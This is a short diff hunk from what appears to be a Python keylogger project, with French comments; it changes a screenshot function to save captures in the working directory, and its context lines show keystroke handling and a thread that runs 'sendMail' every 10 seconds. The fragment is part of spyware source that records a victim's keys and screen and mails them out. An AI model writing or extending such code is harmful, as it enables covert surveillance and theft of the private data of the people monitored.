@@ -111,7 +111,9 @@ def on_press(key):
 
 def screen():
     screen = PIL.ImageGrab.grab()
-    screen.save("/home/daoudi/Documents/outil_hack/keylogger/test/screen.png")
+    path = os.getcwd()
+    path+="\screen.png"
+    screen.save(path)
 
 # Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
 def mail_thread():
